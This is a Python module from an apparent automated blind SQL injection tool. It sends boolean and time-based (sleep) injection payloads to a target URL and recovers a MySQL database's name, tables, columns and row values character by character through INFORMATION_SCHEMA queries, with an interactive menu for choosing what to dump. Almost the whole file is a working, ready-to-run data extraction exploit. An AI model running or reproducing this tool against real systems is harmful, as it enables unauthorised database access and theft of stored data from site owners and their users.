import time
from Modules.RequestHandler import send_payload
from Modules.ResponseAnalyzer import analyze_response
from Modules.URLUtils import construct_test_url


def prompt_user(vulnerability_type):
    while True:
        proceed = input(f"{vulnerability_type} vulnerability detected! Proceed with exploitation? (y/n): ").lower()
        if proceed in ["y", "n"]:
            return proceed == "y"
        else:
            print("Invalid input. Please enter 'y' or 'n'.")


def exploit_sqli_length(default_response, target_url, id_value, exploitable_payload, method):
    length = 1
    while True:
        if method == "boolean":
            insertion_payload = f'IF((SELECT+LENGTH(DATABASE()))={length},1,2)%23'
        elif method == "time-based":
            insertion_payload = f'IF((SELECT+LENGTH(DATABASE()))={length},sleep(3),2)%23'
        else:
            return
        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)

        # Measure time manually
        start_time = time.time()
        response = send_payload(test_url)
        end_time = time.time()

        elapsed_time = end_time - start_time

        if method == "boolean":
            if analyze_response(default_response, response, updated_payload):
                print(f"\nDatabase name length found: {length}\n")
                return length
        elif method == "time-based":
            if elapsed_time >= 3:
                print(f"\nDatabase name length found: {length}\n")
                return length

        length += 1
        print(length)


def find_database_name(target_url, id_value, db_length, default_response, exploitable_payload, method):
    database_name = ""

    for i in range(1, db_length + 1):
        for ascii_code in range(32, 127):
            ascii_char = chr(ascii_code)

            if method == "boolean":
                insertion_payload = f"IF((SELECT+SUBSTRING(DATABASE(), {i}, 1))='{ascii_char}',1,2)%23"
            elif method == "time-based":
                insertion_payload = f"IF((SELECT+SUBSTRING(DATABASE(), {i}, 1))='{ascii_char}',sleep(3),2)%23"
            else:
                return

            updated_payload = exploitable_payload[:-4] + insertion_payload
            test_url = construct_test_url(target_url, id_value, updated_payload)

            # Measure time manually
            start_time = time.time()
            response = send_payload(test_url)
            end_time = time.time()

            elapsed_time = end_time - start_time

            if method == "boolean" and analyze_response(default_response, response, updated_payload):
                database_name += ascii_char
                break
            elif method == "time-based" and elapsed_time >= 3:
                database_name += ascii_char
                break

            print(f"Database Name: {database_name}{ascii_char}")
    return database_name


def find_table_count(target_url, id_value, default_response, exploitable_payload, method):
    table_count = 1
    max_attempts = 100

    while True:
        if method == "boolean":
            insertion_payload = f"IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())={table_count},1,2)%23"
        elif method == "time-based":
            insertion_payload = f"IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())={table_count},sleep(3),2)%23"

        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)

        # Measure time manually
        start_time = time.time()
        response = send_payload(test_url)
        end_time = time.time()

        elapsed_time = end_time - start_time

        if method == "boolean" and analyze_response(default_response, response, updated_payload):
            print(f"Found number of tables: {table_count}\n")
            return table_count
        elif method == "time-based" and elapsed_time >= 3:
            print(f"Found number of tables: {table_count}\n")
            return table_count

        table_count += 1

        if table_count > max_attempts:
            print("Reached maximum attempts, exiting.")
            break

    print("Unable to determine the number of tables.")
    return None


def find_table_names(target_url, id_value, table_count, default_response, exploitable_payload, method):
    table_names = []

    for table_index in range(table_count):
        current_table_name = ""

        for i in range(1, 51):
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                # ATTENTION: maybe this part do not work fine for other cases
                if ascii_char == ' ' or ascii_char == '+':
                    continue

                if method == "boolean":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE"
                                         f"+TABLE_SCHEMA=DATABASE()+LIMIT+{table_index},1), {i}, 1))='{ascii_char}',1,"
                                         f"2)%23")
                elif method == "time-based":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE"
                                         f"+TABLE_SCHEMA=DATABASE()+LIMIT+{table_index},1), {i}, 1))='{ascii_char}',sleep(3),"
                                         f"2)%23")
                else:
                    return

                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)

                # Measure time manually
                start_time = time.time()
                response = send_payload(test_url)
                end_time = time.time()

                elapsed_time = end_time - start_time

                if method == "boolean" and analyze_response(default_response, response, updated_payload):
                    current_table_name += ascii_char
                    break
                elif method == "time-based" and elapsed_time >= 3:
                    current_table_name += ascii_char
                    break
                print(f"Current Table Name: {current_table_name}{ascii_char}")
            else:
                break

        table_names.append(current_table_name)
        print(f"Found table {table_index + 1}: {current_table_name}\n")

    return table_names


def find_column_count(target_url, id_value, table_name, default_response, exploitable_payload, method):
    column_count = 0

    while True:
        if method == "boolean":
            insertion_payload = (
                f"IF((SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
                f"WHERE TABLE_NAME='{table_name}') > {column_count}, 1, 0)%23"
            )
        elif method == "time-based":
            insertion_payload = (f"IF((SELECT+COUNT(COLUMN_NAME)+FROM+INFORMATION_SCHEMA.COLUMNS+"
                                 f"WHERE+TABLE_NAME='{table_name}')>{column_count},sleep(3),0)%23")
        else:
            return

        updated_payload = exploitable_payload[:-4] + insertion_payload
        test_url = construct_test_url(target_url, id_value, updated_payload)

        # Measure time manually
        start_time = time.time()
        response = send_payload(test_url)
        end_time = time.time()

        elapsed_time = end_time - start_time

        if (method == "boolean" and analyze_response(default_response, response, updated_payload)) or \
           (method == "time-based" and elapsed_time >= 3):
            column_count += 1
            print(column_count)
        else:
            break

    print(f"Total columns in table '{table_name}': {column_count}")
    return column_count


def find_column_names(target_url, id_value, table_name, column_count, default_response, exploitable_payload, method):
    columns = []

    for column_index in range(column_count):
        current_column_name = ""

        for i in range(1, 51):  # Assume column name length limit as 50 characters
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char = chr(ascii_code)

                # ATTENTION: maybe this part do not work fine for other cases
                if ascii_char == ' ' or ascii_char == '+':
                    continue

                if method == "boolean":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+COLUMN_NAME+FROM+INFORMATION_SCHEMA"
                                         f".COLUMNS+"
                                         f"WHERE+TABLE_NAME='{table_name}'+LIMIT+{column_index},1), {i}, 1))='{ascii_char}',1,0)%23")
                elif method == "time-based":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+COLUMN_NAME+FROM+INFORMATION_SCHEMA"
                                         f".COLUMNS+"
                                         f"WHERE+TABLE_NAME='{table_name}'+LIMIT+{column_index},1), {i}, 1))='{ascii_char}',sleep(3),0)%23")
                else:
                    return

                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)

                # Measure time manually
                start_time = time.time()
                response = send_payload(test_url)
                end_time = time.time()

                elapsed_time = end_time - start_time
                print(f"Current Column Name: {current_column_name}{ascii_char}")

                if (method == "boolean" and analyze_response(default_response, response, updated_payload)) or \
                   (method == "time-based" and elapsed_time >= 3):
                    current_column_name += ascii_char
                    # print(f"Found character at position {i} of column {column_index + 1}: {ascii_char}\n")
                    # print(f"Current column name: {current_column_name}\n")
                    found_char = True
                    break
            if not found_char:
                break

        if not current_column_name:
            print(f"Could not find more columns beyond index {column_index}.")
            break

        columns.append(current_column_name)

    return columns


def find_column_values(target_url, id_value, table_name, column_name, default_response, exploitable_payload, method):
    values = []
    value_index = 0

    while True:
        current_value = ""

        for i in range(1, 51):
            found_char = False
            for ascii_code in range(32, 127):
                ascii_char: str = chr(ascii_code)

                if method == "boolean":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+{column_name}+FROM+{table_name}+"
                                         f"LIMIT+{value_index},1), {i}, 1))='{ascii_char}',1,0)%23")
                elif method == "time-based":
                    insertion_payload = (f"IF((SELECT+SUBSTRING((SELECT+{column_name}+FROM+{table_name}+"
                                         f"LIMIT+{value_index},1), {i}, 1))='{ascii_char}',sleep(3),0)%23")
                else:
                    return

                updated_payload = exploitable_payload[:-4] + insertion_payload
                test_url = construct_test_url(target_url, id_value, updated_payload)

                # Measure time manually
                start_time = time.time()
                response = send_payload(test_url)
                end_time = time.time()

                elapsed_time = end_time - start_time
                print(f"Current Value: {current_value}{ascii_char}")

                # Evaluate the response based on the method
                if (method == "boolean" and analyze_response(default_response, response, updated_payload)) or \
                   (method == "time-based" and elapsed_time >= 3):
                    current_value += ascii_char
                    # print(f"Found character at position {i} of value {value_index + 1}: {ascii_char}")
                    # print(f"Current value: {current_value}\n")
                    found_char = True
                    break

            if not found_char:
                break

        if not current_value:
            break

        values.append(current_value)
        print(f"Found value {value_index + 1}: {current_value}")
        value_index += 1

    print(f"All found values for column '{column_name}' in table '{table_name}': {values}")
    return values


def start_exploitation(default_response, target_url, id_value, method, exploitable_payload):
    if method not in ["boolean", "time-based"]:
        print("Invalid method selected. Please choose 'boolean' or 'time-based' method.")
        return

    # Initialize storage for found data
    found_data = {
        "Database": None,
        "Tables": {},  # Tables will contain {table_name: {"Columns": {}, "Values": {}}}
    }

    # Step 1: Find the database name
    print("[*] Finding database name...")
    db_length = exploit_sqli_length(default_response, target_url, id_value, exploitable_payload, method)
    db_name = find_database_name(target_url, id_value, db_length, default_response, exploitable_payload, method).strip()
    found_data["Database"] = db_name
    print(f"Database found: {db_name}")

    # Step 2: Find table names
    print("[*] Finding table names...")
    table_count = find_table_count(target_url, id_value, default_response, exploitable_payload, method)
    table_names = [table_name.strip() for table_name in find_table_names(
        target_url, id_value, table_count, default_response, exploitable_payload, method)]

    for table_name in table_names:
        found_data["Tables"][table_name] = {"Columns": {}, "Values": {}}
    print(f"Tables found: {', '.join(table_names)}")

    # Interaction loop
    while True:
        # Table selection
        print("\nAvailable Tables:")
        for i, table in enumerate(found_data["Tables"], start=1):
            print(f"{i}: {table}")
        print(f"{len(found_data['Tables']) + 1}: Close Program")
        table_choice = input("Choose a table by number: ")

        try:
            table_choice = int(table_choice)
            if table_choice == len(found_data["Tables"]) + 1:
                print("Closing the program. Goodbye!")
                break
            elif 1 <= table_choice <= len(found_data["Tables"]):
                selected_table = list(found_data["Tables"].keys())[table_choice - 1]
                print(f"Selected Table: {selected_table}")

                # Step 3: Find columns if not already found
                if not found_data["Tables"][selected_table]["Columns"]:
                    print(f"[*] Finding columns for table '{selected_table}'...")
                    column_count = find_column_count(target_url, id_value, selected_table, default_response,
                                                     exploitable_payload, method)
                    column_names = [column_name.strip() for column_name in find_column_names(
                        target_url, id_value, selected_table, column_count, default_response, exploitable_payload, method)]
                    for column_name in column_names:
                        found_data["Tables"][selected_table]["Columns"][column_name] = None
                    print(f"Columns found: {', '.join(column_names)}")

                # Column selection loop
                while True:
                    print(f"\nCurrently exploring table: {selected_table}")
                    columns = list(found_data["Tables"][selected_table]["Columns"].keys())
                    print("Available Columns:")
                    for i, column in enumerate(columns, start=1):
                        print(f"{i}: {column}")
                    print(f"{len(columns) + 1}: Go Back")
                    column_choice = input("Choose a column by number: ")

                    try:
                        column_choice = int(column_choice)
                        if column_choice == len(columns) + 1:
                            print("Going back to table selection.")
                            break
                        elif 1 <= column_choice <= len(columns):
                            selected_column = columns[column_choice - 1]
                            print(f"Selected Column: {selected_column}")

                            # Step 4: Find values if not already found
                            if not found_data["Tables"][selected_table]["Columns"][selected_column]:
                                print(f"[*] Finding values for column '{selected_column}' in table '{selected_table}'...")
                                values = [value.strip() for value in find_column_values(
                                    target_url, id_value, selected_table, selected_column, default_response,
                                    exploitable_payload, method)]
                                found_data["Tables"][selected_table]["Columns"][selected_column] = values
                                print(f"Values found: {values}")
                            else:
                                print(f"Values already found for column '{selected_column}': "
                                      f"{found_data['Tables'][selected_table]['Columns'][selected_column]}")

                            # Value exploration complete, offer option to go back
                            back_choice = input("Enter 'B' to go back or 'C' to close the program: ").strip().lower()
                            if back_choice == 'c':
                                print("Closing the program. Goodbye!")
                                return
                            elif back_choice != 'b':
                                print("Invalid choice. Returning to column selection.")
                            elif back_choice == 'b':
                                print("Returning to column selection.")
                        else:
                            print("Invalid choice. Please choose a valid column number.")
                    except ValueError:
                        print("Invalid input. Please enter a valid number.")
            else:
                print("Invalid choice. Please choose a valid table number.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")
